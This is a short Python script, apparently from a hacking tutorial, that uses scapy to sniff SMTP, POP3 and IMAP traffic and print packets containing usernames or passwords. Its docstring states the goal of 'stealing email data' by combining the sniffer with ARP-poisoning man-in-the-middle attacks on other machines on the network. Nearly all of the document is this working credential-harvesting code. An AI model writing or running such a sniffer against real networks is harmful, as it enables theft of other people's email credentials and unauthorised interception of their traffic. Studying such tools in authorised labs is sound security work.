from scapy.all import *

""" 
	Stealing Email Data
	The idea of this script is to build a sniffer to capture SMTP, POP3, and IMAP credentials. Once we couple this sniffer with some MITM attack (such as **ARP poisoning), we can steal credentials from other machines in the network.
    With this in mind, we write a script that runs a sniffer on all the interfaces, with no filtering. The sniff's store=0 attribute ensures that the packets are not kept in memory (so we can leave it running):
"""
def packet_callback(packet):
    # check to make sure it has a data payload
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print '[*] Server: %s' % packet[IP].dst
            print '[*] %s' %packet[TCP].payload

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, count=5)

